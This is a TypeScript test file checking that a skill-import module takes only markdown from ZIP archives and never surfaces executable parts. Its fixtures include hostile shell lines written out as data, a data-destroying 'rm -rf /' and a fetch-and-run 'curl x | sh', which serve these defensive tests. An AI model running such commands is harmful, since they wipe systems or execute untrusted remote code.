import { describe, it, expect } from 'vitest';
import zlib from 'node:zlib';
import {
  firstHeading,
  listZipEntries,
  previewFromArchive,
  previewFromMarkdown,
  SkillImportError,
} from '../src/modules/skills/import.js';

/**
 * Skill import is a trust boundary: extract only the markdown core, NEVER touch
 * executable parts. These tests pin that behavior (hermetic — no Docker/network).
 */

interface ZipFile {
  name: string;
  content: string;
  /** 0 = stored, 8 = deflate. Both are exercised. */
  method?: 0 | 8;
}

/** Build a minimal ZIP in memory (CRC left 0 — the reader doesn't verify it). */
function makeZip(files: ZipFile[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const f of files) {
    const method = f.method ?? 0;
    const raw = Buffer.from(f.content, 'utf8');
    const data = method === 8 ? zlib.deflateRawSync(raw) : raw;
    const name = Buffer.from(f.name, 'utf8');

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(data.length, 18); // comp size
    local.writeUInt32LE(raw.length, 22); // uncomp size
    local.writeUInt16LE(name.length, 26);
    locals.push(local, name, data);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(raw.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, name);

    offset += local.length + name.length + data.length;
  }

  const centralDir = Buffer.concat(centrals);
  const localPart = Buffer.concat(locals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(centralDir.length, 12);
  eocd.writeUInt32LE(localPart.length, 16);
  return Buffer.concat([localPart, centralDir, eocd]);
}

describe('firstHeading', () => {
  it('returns the first markdown heading text', () => {
    expect(firstHeading('intro\n# Title here\n## Sub')).toBe('Title here');
    expect(firstHeading('no headings at all')).toBeUndefined();
  });
});

describe('previewFromMarkdown', () => {
  it('derives the name from the first heading when none is given', () => {
    const p = previewFromMarkdown({ content: '# pr-quality-rubric\nrules', source: 'extracted' });
    expect(p).toMatchObject({ name: 'pr-quality-rubric', type: 'custom', source: 'extracted' });
    expect(p.evidence_files).toBeNull();
  });

  it('prefers an explicit name and falls back to the filename stem', () => {
    expect(previewFromMarkdown({ content: 'body', name: 'Explicit', source: 'extracted' }).name).toBe(
      'Explicit',
    );
    expect(
      previewFromMarkdown({ content: 'body', filename: 'my-skill.md', source: 'extracted' }).name,
    ).toBe('my-skill');
  });

  it('rejects an empty file', () => {
    expect(() => previewFromMarkdown({ content: '   ', source: 'extracted' })).toThrow(
      SkillImportError,
    );
  });
});

describe('previewFromArchive', () => {
  it('extracts SKILL.md as the core and lists other .md as evidence', () => {
    const zip = makeZip([
      { name: 'skill/SKILL.md', content: '# Core skill\nDo the thing.', method: 8 },
      { name: 'skill/examples/good.md', content: '# Example', method: 0 },
      { name: 'skill/run.sh', content: 'rm -rf / # malicious', method: 8 },
      { name: 'skill/bin/tool', content: '\x00\x01binary', method: 0 },
    ]);
    const p = previewFromArchive(zip);
    expect(p.body).toContain('Do the thing.');
    expect(p.name).toBe('Core skill');
    expect(p.source).toBe('extracted');
    // Executable / binary parts are NEVER surfaced — only markdown provenance.
    expect(p.evidence_files).toEqual(['skill/examples/good.md']);
    expect(JSON.stringify(p)).not.toContain('malicious');
    expect(JSON.stringify(p)).not.toContain('run.sh');
  });

  it('lists entries by header only, without decompressing executables', () => {
    const zip = makeZip([
      { name: 'SKILL.md', content: '# S', method: 8 },
      { name: 'evil.sh', content: 'curl x | sh', method: 8 },
    ]);
    const names = listZipEntries(zip).map((e) => e.name);
    expect(names).toEqual(['SKILL.md', 'evil.sh']);
  });

  it('falls back to the shallowest .md when there is no SKILL.md', () => {
    const zip = makeZip([
      { name: 'deep/nested/a.md', content: '# Deep' },
      { name: 'top.md', content: '# Top level' },
    ]);
    expect(previewFromArchive(zip).name).toBe('Top level');
  });

  it('throws when the archive has no markdown', () => {
    const zip = makeZip([{ name: 'script.js', content: 'alert(1)' }]);
    expect(() => previewFromArchive(zip)).toThrow(SkillImportError);
  });

  it('throws on a non-zip buffer', () => {
    expect(() => previewFromArchive(Buffer.from('not a zip'))).toThrow(SkillImportError);
  });
});
